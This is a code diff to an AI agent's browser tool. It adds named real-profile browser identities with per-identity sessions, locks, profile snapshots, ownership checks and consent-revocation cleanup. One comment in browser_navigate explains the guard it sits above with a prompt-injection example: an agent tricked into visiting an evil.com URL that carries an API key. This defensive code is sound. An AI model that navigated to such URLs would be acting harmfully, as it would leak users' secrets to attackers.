@@ -1524,7 +1524,8 @@ def _use_real_profile() -> bool:
 # tasks reuse the same copy-browser instead of each launching a rival Chromium
 # on the same copied user-data-dir.
 _REAL_PROFILE_SESSION = "hermes-real-profile"
-_real_profile_cdp_lock = threading.Lock()
+_real_profile_cdp_locks_guard = threading.Lock()
+_real_profile_cdp_locks: dict[str, threading.Lock] = {}
 _real_profile_cdp_cache: dict = {}
 _real_profile_chrome_procs: list = []  # Popen handles of directly-launched real browsers
 
@@ -1548,6 +1549,72 @@ def _terminate_real_profile_chrome() -> None:
                     proc.kill()
         except Exception as e:
             logger.debug("real-profile chrome terminate failed: %s", e)
+_real_profile_session_names: dict[str, str] = {}
+_real_profile_session_homes: dict[str, str] = {}
+
+
+def _real_profile_runtime_resources(identity) -> tuple[str, threading.Lock, str]:
+    """Return an identity-owned agent-browser session, lock, and cache key."""
+    from hermes_cli.browser_identity import browser_identity_scope_key
+
+    runtime_key = browser_identity_scope_key(
+        identity.runtime_key if identity is not None else "legacy-real-profile"
+    )
+    with _real_profile_cdp_locks_guard:
+        lock = _real_profile_cdp_locks.setdefault(runtime_key, threading.Lock())
+        session_name = (
+            f"hermes-rp-{runtime_key}"
+            if identity is not None
+            else f"{_REAL_PROFILE_SESSION}-{runtime_key}"
+        )
+    kind = "identity" if identity is not None else "legacy"
+    return session_name, lock, f"{kind}:{runtime_key}"
+
+
+def _track_real_profile_session(cache_key: str, session_name: str) -> None:
+    from hermes_constants import hermes_home_key
+
+    with _real_profile_cdp_locks_guard:
+        _real_profile_session_names[cache_key] = session_name
+        _real_profile_session_homes[cache_key] = hermes_home_key()
+
+
+def _reload_browser_use_runtime(runtime_key: str) -> bool:
+    try:
+        from tools.browser_use_cli import _reload_browser_exec_daemons_for_runtime
+
+        return _reload_browser_exec_daemons_for_runtime(runtime_key)
+    except Exception as exc:
+        logger.debug("Browser Use identity daemon reload failed for %s: %s", runtime_key, exc)
+        return False
+
+
+def _close_all_real_profile_runtimes(*, all_profiles: bool = False) -> None:
+    """Close copy-browsers in the active profile, or every profile at exit."""
+    from hermes_constants import hermes_home_key
+
+    active_home = None if all_profiles else hermes_home_key()
+    try:
+        from tools.browser_use_cli import _close_all_browser_exec_identity_daemons
+
+        _close_all_browser_exec_identity_daemons(all_profiles=all_profiles)
+    except Exception as exc:
+        logger.debug("Browser Use identity daemon cleanup failed: %s", exc)
+    with _real_profile_cdp_locks_guard:
+        selected_keys = tuple(
+            key
+            for key in _real_profile_session_names
+            if all_profiles
+            or _real_profile_session_homes.get(key) == active_home
+        )
+        sessions = tuple({_real_profile_session_names[key] for key in selected_keys})
+        for key in selected_keys:
+            _real_profile_session_names.pop(key, None)
+            _real_profile_session_homes.pop(key, None)
+    for session_name in sessions:
+        _agent_browser_close_session(session_name, timeout=3.0)
+    for key in selected_keys:
+        _real_profile_cdp_cache.pop(key, None)
 
 
 def _agent_browser_argv(browser_cmd: str) -> list:
@@ -1614,7 +1681,40 @@ def _cdp_on_data_dir(http_cdp: str, data_dir: str) -> bool:
         return False
 
 
-def _agent_browser_close_session(session_name: str) -> None:
+def _process_uses_data_dir(data_dir: str) -> bool:
+    """Return whether a live Chromium process owns the expected user-data-dir."""
+    try:
+        import psutil
+    except ImportError:
+        return False
+
+    expected = os.path.normcase(os.path.realpath(data_dir))
+    for proc in psutil.process_iter(["cmdline"]):
+        try:
+            command = proc.info.get("cmdline") or []
+        except (psutil.Error, OSError):
+            continue
+        for index, arg in enumerate(command):
+            candidate = None
+            if arg.startswith("--user-data-dir="):
+                candidate = arg.partition("=")[2]
+            elif arg == "--user-data-dir" and index + 1 < len(command):
+                candidate = command[index + 1]
+            if candidate and os.path.normcase(os.path.realpath(candidate)) == expected:
+                return True
+    return False
+
+
+def _cdp_owned_by_data_dir(http_cdp: str, data_dir: str) -> bool:
+    """Verify a ready CDP is backed by a live process on the expected snapshot."""
+    return (
+        _cdp_http_ready(http_cdp)
+        and _cdp_on_data_dir(http_cdp, data_dir)
+        and _process_uses_data_dir(data_dir)
+    )
+
+
+def _agent_browser_close_session(session_name: str, *, timeout: float = 15.0) -> None:
     """Best-effort close of an agent-browser session (stale/wrong-dir cleanup)."""
     try:
         browser_cmd = _find_agent_browser()
@@ -1623,13 +1723,13 @@ def _agent_browser_close_session(session_name: str) -> None:
     try:
         subprocess.run(
             [*_agent_browser_argv(browser_cmd), "--session", session_name, "close"],
-            capture_output=True, text=True, timeout=15, env=_build_browser_env(),
+            capture_output=True, text=True, timeout=timeout, env=_build_browser_env(),
         )
     except (subprocess.SubprocessError, OSError) as e:
         logger.debug("real-profile session close failed: %s", e)
 
 
-def _real_profile_cdp() -> tuple:
+def _real_profile_cdp(requested_identity: str | None = None) -> tuple:
     """Resolve ``(cdp_url, error)`` for consented real-profile browsing.
 
     Snapshots the user's default-Chromium profile into a hermes-owned copy
@@ -1646,17 +1746,16 @@ def _real_profile_cdp() -> tuple:
     ``(None, None)`` when consent is off.
     """
     if not _use_real_profile():
-        # Consent is off. If a snapshot store from a previous consented run is
-        # still on disk, it holds copies of the user's cookies/logins — delete
-        # it so revoking consent actually removes the credential copies. Cheap
-        # (one isdir check) and idempotent.
+        # Consent is off. Stop every identity-owned daemon and copy-browser
+        # before deleting the credential-bearing snapshot store.
+        _close_all_real_profile_runtimes()
         try:
             from hermes_cli.browser_connect import cleanup_real_profile_snapshots
 
             cleanup_real_profile_snapshots()
         except Exception as e:
             logger.debug("real-profile cleanup-on-consent-off failed: %s", e)
-        _real_profile_cdp_cache.pop("cdp", None)
+        _real_profile_cdp_cache.clear()
         return None, None
 
     # Lightpanda cannot load a Chromium profile — agent-browser rejects
@@ -1675,18 +1774,37 @@ def _real_profile_cdp() -> tuple:
     from hermes_cli.browser_connect import (
         UNSUPPORTED_CHANNEL,
         detect_default_chromium,
+        real_profile_data_dir,
         real_profile_copy_dir,
         snapshot_real_profile,
     )
+    from contextlib import nullcontext
+    from hermes_cli.browser_identity import (
+        BrowserIdentityError,
+        BrowserIdentityProcessLock,
+        resolve_browser_identity,
+    )
 
-    with _real_profile_cdp_lock:
+    try:
+        identity = resolve_browser_identity(requested_identity)
+    except BrowserIdentityError as exc:
+        return None, str(exc)
+
+    session_name, identity_lock, cache_key = _real_profile_runtime_resources(identity)
+    scoped_runtime_key = cache_key.partition(":")[2] if identity is not None else ""
+    process_lock = (
+        BrowserIdentityProcessLock(scoped_runtime_key)
+        if identity is not None
+        else nullcontext()
+    )
+
+    with identity_lock, process_lock:
         # Reuse a live copy-browser from an earlier call this process made.
-        cached = _real_profile_cdp_cache.get("cdp")
-        if cached and _cdp_http_ready(cached):
+        cached = _real_profile_cdp_cache.get(cache_key)
+        if identity is None and cached and _cdp_http_ready(cached):
             return cached, None
-        _real_profile_cdp_cache.pop("cdp", None)
 
-        browser = detect_default_chromium()
+        browser = identity.browser if identity is not None else detect_default_chromium()
         if browser is None:
             return None, (
                 "browser.use_real_profile is on, but your default browser is not a "
@@ -1718,18 +1836,52 @@ def _real_profile_cdp() -> tuple:
         # as a PATH only (no copy), probe reuse, and return early on a hit. The
         # snapshot/overlay happens solely on the relaunch path below, when no
         # live browser owns the dir.
-        copy_dir = real_profile_copy_dir(browser)
-        existing = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
-        if existing and _cdp_http_ready(existing) and _cdp_on_data_dir(existing, copy_dir):
-            _real_profile_cdp_cache["cdp"] = existing
+        copy_dir = real_profile_copy_dir(
+            browser,
+            identity=identity.alias if identity is not None else None,
+            source_profile=identity.source_profile if identity is not None else "",
+        )
+
+        if identity is not None and cached:
+            if _cdp_owned_by_data_dir(cached, copy_dir):
+                return cached, None
+            _agent_browser_close_session(session_name)
+        _real_profile_cdp_cache.pop(cache_key, None)
+        if identity is not None:
+            # Browser Use daemons retain their original CDP attachment. Stop
+            # them before relaunching this identity on a new endpoint.
+            if not _reload_browser_use_runtime(scoped_runtime_key):
+                return None, (
+                    "could not stop the identity's stale Browser Use session; "
+                    "refusing to relaunch it on a different CDP endpoint"
+                )
+
+        existing = _agent_browser_get_cdp(session_name)
+        existing_owned = (
+            _cdp_owned_by_data_dir(existing, copy_dir)
+            if identity is not None and existing
+            else bool(
+                existing
+                and _cdp_http_ready(existing)
+                and _cdp_on_data_dir(existing, copy_dir)
+            )
+        )
+        if existing and existing_owned:
+            _real_profile_cdp_cache[cache_key] = existing
+            _track_real_profile_session(cache_key, session_name)
             return existing, None
         if existing:
             # Stale/wrong-dir session (throwaway-temp fallback, or an old copy):
             # close it so nothing holds the dir open before we overlay + relaunch.
-            _agent_browser_close_session(_REAL_PROFILE_SESSION)
+            _agent_browser_close_session(session_name)
 
         # No live browser owns the dir now — safe to (re)snapshot + overlay.
-        snap_dir, err = snapshot_real_profile(browser)
+        snap_dir, err = snapshot_real_profile(
+            browser,
+            src=real_profile_data_dir(browser) if identity is not None else None,
+            source_profile=identity.source_profile if identity is not None else None,
+            identity=identity.alias if identity is not None else None,
+        )
         if err or not snap_dir:
             from hermes_cli.browser_connect import _PROFILE_LOCKED_PREFIX
 
@@ -1860,7 +2012,7 @@ def _real_profile_cdp() -> tuple:
             )
         argv = [
             *_agent_browser_argv(browser_cmd),
-            "--session", _REAL_PROFILE_SESSION,
+            "--session", session_name,
             "--cdp", str(port),
             "open", "about:blank",
         ]
@@ -1885,7 +2037,7 @@ def _real_profile_cdp() -> tuple:
                 f"failed to start: {reason}"
             )
 
-        cdp = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
+        cdp = _agent_browser_get_cdp(session_name)
         # The daemon may answer with the endpoint of a
         # browser IT spawned (throwaway temp profile) instead of the real
         # Chrome we launched on the copy. The DevToolsActivePort file OUR
@@ -1905,8 +2057,21 @@ def _real_profile_cdp() -> tuple:
                 "started without exposing a devtools endpoint. Retry, or turn "
                 "the toggle off."
             )
-        _real_profile_cdp_cache["cdp"] = cdp
-        logger.info("real-profile browser ready for %s at %s (%s)", browser, cdp, copy_dir)
+        if identity is not None and not _cdp_owned_by_data_dir(cdp, copy_dir):
+            _agent_browser_close_session(session_name)
+            return None, (
+                "browser.use_real_profile is on, but the launched browser did not "
+                "prove ownership of the identity snapshot; refusing the CDP attach"
+            )
+        _real_profile_cdp_cache[cache_key] = cdp
+        _track_real_profile_session(cache_key, session_name)
+        logger.info(
+            "real-profile browser ready for %s%s at %s (%s)",
+            browser,
+            f" identity {identity.alias!r}" if identity is not None else "",
+            cdp,
+            copy_dir,
+        )
         return cdp, None
 
 
@@ -2930,8 +3095,27 @@ BROWSER_TOOL_SCHEMAS = [
 # Utility Functions
 # ============================================================================
 
-def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict[str, str]:
+def _create_local_session(
+    task_id: str,
+    allow_real_profile: bool = True,
+    identity: str | None = None,
+) -> Dict[str, Any]:
     import uuid
+    from hermes_cli.browser_identity import BrowserIdentityError, resolve_browser_identity
+
+    resolved_identity = None
+    if identity:
+        try:
+            resolved_identity = resolve_browser_identity(identity)
+        except BrowserIdentityError as exc:
+            raise RuntimeError(str(exc)) from exc
+        if resolved_identity is None:
+            raise RuntimeError("browser identity could not be resolved")
+        if not _use_real_profile():
+            raise RuntimeError(
+                "named browser identities require browser.use_real_profile: true; "
+                "Hermes will not fall back to a signed-out browser"
+            )
 
     # Real-profile consent: instead of an agent-browser-managed throwaway
     # Chromium, attach this local session (via CDP) to the user's default
@@ -2948,7 +3132,12 @@ def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict
     # profile. (Also keeps a real-profile resolve failure from breaking
     # private-URL routing, which has nothing to do with the real profile.)
     if allow_real_profile:
-        cdp_url, err = _real_profile_cdp()
+        try:
+            cdp_url, err = (
+                _real_profile_cdp(identity) if identity else _real_profile_cdp()
+            )
+        except BrowserIdentityError as exc:
+            raise RuntimeError(str(exc)) from exc
         if err:
             raise RuntimeError(err)
         if cdp_url:
@@ -2956,12 +3145,25 @@ def _create_local_session(task_id: str, allow_real_profile: bool = True) -> Dict
             logger.info(
                 "Created real-profile local session %s for task %s", session_name, task_id
             )
-            return {
+            session_info = {
                 "session_name": session_name,
                 "bb_session_id": None,
                 "cdp_url": _resolve_cdp_override(cdp_url),
                 "features": {"local": True, "real_profile": True},
             }
+            if identity:
+                if resolved_identity is None:  # defensive: non-empty aliases always resolve
+                    raise RuntimeError("browser identity could not be resolved")
+                from hermes_cli.browser_identity import browser_identity_scope_key
+
+                session_info["browser_identity"] = identity
+                session_info["browser_identity_key"] = browser_identity_scope_key(
+                    resolved_identity.runtime_key
+                )
+                from hermes_constants import hermes_home_key
+
+                session_info["browser_identity_home"] = hermes_home_key()
+            return session_info
 
     # Browser Use mode drives whatever CDP endpoint it is handed; with
     # ``browser.engine: lightpanda`` that endpoint is a Hermes-spawned
@@ -3029,7 +3231,10 @@ def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
     }
 
 
-def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
+def _get_session_info(
+    task_id: Optional[str] = None,
+    identity: str | None = None,
+) -> Dict[str, Any]:
     """
     Get or create session info for the given session key.
 
@@ -3049,6 +3254,35 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
     """
     if task_id is None:
         task_id = "default"
+
+    requested_identity_key = None
+    if identity:
+        from hermes_cli.browser_identity import BrowserIdentityError, resolve_browser_identity
+
+        try:
+            resolved_identity = resolve_browser_identity(identity)
+        except BrowserIdentityError as exc:
+            raise RuntimeError(str(exc)) from exc
+        if resolved_identity is None:  # defensive: non-empty aliases always resolve
+            raise RuntimeError("browser identity could not be resolved")
+        from hermes_cli.browser_identity import browser_identity_scope_key
+
+        requested_identity_key = browser_identity_scope_key(resolved_identity.runtime_key)
+
+    def _ensure_identity_binding(session_info: Dict[str, Any]) -> None:
+        if session_info.get("browser_identity"):
+            from hermes_constants import hermes_home_key
+
+            if session_info.get("browser_identity_home") != hermes_home_key():
+                raise RuntimeError(
+                    "browser task belongs to another Hermes profile; start a new task "
+                    "instead of reusing its cookie jar"
+                )
+        if identity and session_info.get("browser_identity_key") != requested_identity_key:
+            raise RuntimeError(
+                "browser task is already bound to another identity; start a new task "
+                "instead of switching cookie jars"
+            )
 
     # Start the cleanup thread if not running (handles inactivity timeouts)
     _start_browser_cleanup_thread()
@@ -3073,10 +3307,12 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
             replacement = _active_sessions.get(task_id)
         if replacement is not None and replacement is not existing_session:
             # Another thread already recycled and re-created it.
+            _ensure_identity_binding(replacement)
             return replacement
         existing_session = None
 
     if existing_session is not None:
+        _ensure_identity_binding(existing_session)
         if (
             not _session_has_expired(existing_session)
             and not _local_backend_process_dead(existing_session)
@@ -3099,7 +3335,29 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
         with _cleanup_lock:
             replacement = _active_sessions.get(task_id)
         if replacement is not None and replacement is not existing_session:
+            _ensure_identity_binding(replacement)
             return replacement
+
+    # A follow-up command may be the first browser action for a task. Resolve
+    # the configured default here so that session creation is stamped with the
+    # same immutable identity metadata as browser_navigate. Existing sessions
+    # above intentionally inherit their already-bound identity instead.
+    if identity is None:
+        from hermes_cli.browser_identity import (
+            BrowserIdentityError,
+            browser_identity_scope_key,
+            resolve_browser_identity,
+        )
+
+        try:
+            resolved_default = resolve_browser_identity(None)
+        except BrowserIdentityError as exc:
+            raise RuntimeError(str(exc)) from exc
+        if resolved_default is not None:
+            identity = resolved_default.alias
+            requested_identity_key = browser_identity_scope_key(
+                resolved_default.runtime_key
+            )
 
     # Hybrid routing: session keys ending with ``::local`` force a local
     # Chromium regardless of the globally-configured cloud provider.  Public
@@ -3109,6 +3367,11 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
 
     # Create session outside the lock (network call in cloud mode)
     cdp_override = _get_cdp_override()
+    if identity and cdp_override:
+        raise RuntimeError(
+            "named browser identities are incompatible with browser.cdp_url or "
+            "BROWSER_CDP_URL; remove the override or omit identity"
+        )
     if cdp_override and not force_local:
         session_info = _create_cdp_session(task_id, cdp_override)
     elif force_local:
@@ -3118,8 +3381,17 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
         session_info = _create_local_session(task_id, allow_real_profile=False)
     else:
         provider = _get_cloud_provider()
+        if identity and provider is not None:
+            raise RuntimeError(
+                "named browser identities require the local real-profile backend; "
+                "cloud providers cannot use local Chromium identities"
+            )
         if provider is None:
-            session_info = _create_local_session(task_id)
+            session_info = (
+                _create_local_session(task_id, identity=identity)
+                if identity
+                else _create_local_session(task_id)
+            )
         else:
             try:
                 session_info = provider.create_session(task_id)
@@ -3158,7 +3430,9 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, Any]:
         # were doing the network call. Use the existing one to avoid leaking
         # orphan cloud sessions.
         if task_id in _active_sessions:
-            return _active_sessions[task_id]
+            existing = _active_sessions[task_id]
+            _ensure_identity_binding(existing)
+            return existing
         session_info = dict(session_info)
         session_info.setdefault("session_key", task_id)
         session_info.setdefault("owner_task_id", _bare_task_id_for_session_key(task_id))
@@ -4172,7 +4446,11 @@ def evaluate_url_safety(url: str) -> Optional[dict]:
     return None
 
 
-def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
+def browser_navigate(
+    url: str,
+    task_id: Optional[str] = None,
+    identity: str | None = None,
+) -> str:
     """
     Navigate to a URL in the browser.
 
@@ -4183,6 +4461,27 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    from hermes_cli.browser_identity import BrowserIdentityError, resolve_browser_identity
+
+    try:
+        resolved_identity = resolve_browser_identity(identity)
+    except BrowserIdentityError as exc:
+        return json.dumps({"success": False, "error": str(exc)})
+    if resolved_identity is not None:
+        if not _use_real_profile():
+            return json.dumps({
+                "success": False,
+                "error": (
+                    "named browser identities require browser.use_real_profile: true; "
+                    "Hermes will not fall back to a signed-out browser"
+                ),
+            })
+        if _is_camofox_mode():
+            return json.dumps({
+                "success": False,
+                "error": "named browser identities are incompatible with the Camofox backend",
+            })
+
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
@@ -4214,7 +4513,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # cloud provider never sees the URL in that case.  Can also be opted
     # out globally via ``browser.allow_private_urls`` in config.
     effective_task_id = task_id or "default"
-    nav_session_key = _navigation_session_key(effective_task_id, url)
+    nav_session_key = (
+        effective_task_id
+        if resolved_identity is not None
+        else _navigation_session_key(effective_task_id, url)
+    )
     auto_local_this_nav = _is_local_sidecar_key(nav_session_key)
 
     sensitive_query_key = _sensitive_query_param_name(url)
@@ -4280,7 +4583,14 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
 
     # Get session info to check if this is a new session
     # (will create one with features logged if not exists)
-    session_info = _get_session_info(nav_session_key)
+    try:
+        session_info = (
+            _get_session_info(nav_session_key, identity=resolved_identity.alias)
+            if resolved_identity is not None
+            else _get_session_info(nav_session_key)
+        )
+    except RuntimeError as exc:
+        return json.dumps({"success": False, "error": str(exc)})
     is_first_nav = session_info.get("_first_nav", True)
 
     # Auto-start recording if configured and this is first navigation
@@ -4343,6 +4653,8 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         try:
             if (session_info.get("features") or {}).get("real_profile"):
                 response["used_real_profile"] = True
+            if session_info.get("browser_identity"):
+                response["browser_identity"] = session_info["browser_identity"]
         except Exception:
             pass
         # Remember only a successful, non-blocked navigation as the task owner.
@@ -5967,6 +6279,8 @@ def cleanup_all_browsers() -> None:
     except Exception:
         pass
 
+    _close_all_real_profile_runtimes(all_profiles=True)
+
     # Reset cached lookups so they are re-evaluated on next use.
     global _cached_agent_browser, _agent_browser_resolved
     global _cached_command_timeout, _command_timeout_resolved
@@ -6327,6 +6641,57 @@ from tools.browser_extension_router import (
 _BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}
 
 
+def _browser_navigate_schema_overrides() -> dict:
+    """Expose configured identity aliases only on the session entry tool."""
+    from hermes_cli.browser_identity import (
+        configured_identity_aliases,
+        read_browser_identity_config,
+    )
+
+    cfg = read_browser_identity_config()
+    aliases = configured_identity_aliases(cfg)
+    if not aliases:
+        return {}
+    base = _BROWSER_SCHEMA_MAP["browser_navigate"]["parameters"]
+    properties = dict(base["properties"])
+    properties["identity"] = {
+        "type": "string",
+        "enum": list(aliases),
+        "description": (
+            "Configured local real-profile browser identity. It binds this task's "
+            "browser session and cannot be changed by follow-up calls."
+        ),
+    }
+    required = list(base.get("required") or [])
+    if cfg.get("require_identity") is True and "identity" not in required:
+        required.append("identity")
+    return {"parameters": {**base, "properties": properties, "required": required}}
+
+
+def _browser_navigate_handler(args: dict, kw: dict):
+    """Keep named real-profile identities off extension/cloud routing lanes."""
+    from hermes_cli.browser_identity import BrowserIdentityError, resolve_browser_identity
+
+    try:
+        identity = resolve_browser_identity(args.get("identity"))
+    except BrowserIdentityError as exc:
+        return tool_error(str(exc))
+    if identity is not None:
+        return browser_navigate(
+            url=args.get("url", ""),
+            task_id=kw.get("task_id"),
+            identity=args.get("identity"),
+        )
+    return routed_browser_handler(
+        "browser_navigate",
+        args,
+        fallback=lambda: browser_navigate(
+            url=args.get("url", ""), task_id=kw.get("task_id")
+        ),
+        **_browser_router_kw(kw),
+    )
+
+
 def _browser_router_kw(kw: dict) -> dict:
     """Identity kwargs forwarded to the extension router wrapper."""
     return {
@@ -6372,13 +6737,9 @@ registry.register(
     name="browser_navigate",
     toolset="browser",
     schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
-    handler=lambda args, **kw: routed_browser_handler(
-        "browser_navigate",
-        args,
-        fallback=lambda: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
-        **_browser_router_kw(kw),
-    ),
+    handler=lambda args, **kw: _browser_navigate_handler(args, kw),
     check_fn=check_browser_navigate_requirements,
+    dynamic_schema_overrides=_browser_navigate_schema_overrides,
     emoji="🌐",
 )
 registry.register(
